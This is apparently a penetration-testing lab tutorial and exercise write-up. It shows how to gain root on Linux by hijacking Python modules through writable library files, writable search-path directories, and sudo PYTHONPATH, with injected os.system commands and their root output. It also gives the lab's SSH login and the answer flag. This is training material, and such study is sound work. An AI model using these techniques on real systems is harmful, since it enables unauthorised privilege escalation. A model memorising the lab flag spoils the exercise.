# Python Library Hijacking
Python has the Standard Library, with many modules on board from a standard installation of Python. These modules provide many solutions that would otherwise have to be laboriously worked out by writing our programs. 

There are many ways in which we can hijack a Python library. There are three basic attack vectors where hijacking can be used:

- `Insecure Write Permissions`
- `Python Library Search Path`
- `PYTHONPATH Environment Variable`

## Insecure Write Permissions
One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If our user is allowed to run the Python script as `root` via `sudo`, our injected code will automatically be executed with those elevated privileges.

### Checking Privileges

```shellsession
$ sudo -l

Matching Defaults entries for htb-student on lpenix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

By analyzing this output, we understand that we can execute `/home/htb-student/mem_status.py` as `root` using `/usr/bin/python3` without needing to supply a password.

Let's quickly analyze the permissions of the `mem_status.py` Python file.

```shellsession
$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

We see that we can execute this script, and we also have permission to read its contents. We do not have write permission - if we did, we could simply write our payload directly to `mem_status.py`. In addition, we notice that the `SUID` bit is enabled and the file owner is `root`. This special permission can be sometimes be used to escalate privileges. However, Linux ignores the SUID bit on interpreted scripts (like Python or Bash scripts) by default for security reasons. For the SUID bit to actually grant us elevated privileges here, it would need to be set directly on the Python executable itself (`/usr/bin/python3`). Since it is only on the script, it has no effect, which is why we must rely on our `sudo` privileges instead.

Now, let us examine the contents of `mem_status.py`.

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

This script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that it imports the module psutil and uses the function `virtual_memory()`.

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

```shellsession
$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.

This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. 

```shellsession
...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Now we can run the script with `sudo` and check if we get the desired result.

```shellsession
$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

## Python Library Search Path
In Python, each version has a specified order in which libraries (modules) are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.

### PYTHONPATH Listing

```shellsession
$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

To be able to use this variant, two prerequisites are necessary.

- The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
- We must have write permissions to one of the paths having a higher priority on the list.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

### Psutil Default Installation Location

```shellsession
$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

From this example, we can see that psutil is installed in the following path: `/usr/local/lib/python3.8/dist-packages`. From our previous listing of the `PYTHONPATH` variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them. Let us check.

### Misconfigured Directory Permissions

```shellsession
$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

After checking all of the directories listed, it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. 

### Hijacked Module Contents - psutil.py

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. 

```shellsession
$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```

## PYTHONPATH Environment Variable
`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a user-defined location when it comes time to import modules. 

### Checking Sudo Privileges

```shellsession
$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of sudo and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program.

### Privilege Escalation via PYTHONPATH Environment Variable Hijacking

```shellsession
$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`.

## Questions
SSH to 10.129.205.114 (ACADEMY-LLPE-PYHIJACK), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer. **Answer: HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}**
   - Check sudo privileges → we have `sudo` privilege to execute `/usr/bin/python3 /home/htb-student/mem_status.py` as `root`:
   - Check on the script, it is importing `psutil` and uses psutil.virtual_memory():
        ```shellsession
        $ cat /home/htb-student/mem_status.py
        #!/usr/bin/env python3
        import psutil 

        available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

        print(f"Available memory: {round(available_memory, 2)}%")
        ```
   - Check if `psutil` is misconfigured to allow write access:
        ```shellsession
        $ pip3 show psutil
        Name: psutil
        Version: 5.9.5
        Summary: Cross-platform lib for process and system monitoring in Python.
        Home-page: https://github.com/giampaolo/psutil
        Author: Giampaolo Rodola
        Author-email: g.rodola@gmail.com
        License: BSD-3-Clause
        Location: /usr/local/lib/python3.8/dist-packages
        Requires: 
        Required-by: 
        $ grep -r "def virtual_memory()" /usr/local/lib/python3.8/dist-packages/psutil/*
        /usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
        $ ls -la /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
        -rw-r--r-- 1 htb-student staff 87706 Jun 30 15:45 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
        ```
   - Since we have write access to `/usr/local/lib/python3.8/dist-packages/psutil/__init__.py`, we can edit the virtual_memory() function to execute our desired command to read the flag as root:
        ```shellsession
        ...SNIP...

        def virtual_memory():

            ...SNIP...
            #### Hijacking
            import os
            os.system('cat /root/flag.txt')
            

            global _TOTAL_PHYMEM
            ret = _psplatform.virtual_memory()
            # cached for later use in Process.memory_percent()
            _TOTAL_PHYMEM = ret.total
            return ret

        ...SNIP...
        ```
   - Running the script as sudo to achieve LPE:
        ```shellsession
        $ sudo /usr/bin/python3 /home/htb-student/mem_status.py
        HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
        HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
        Available memory: 89.78%
        ```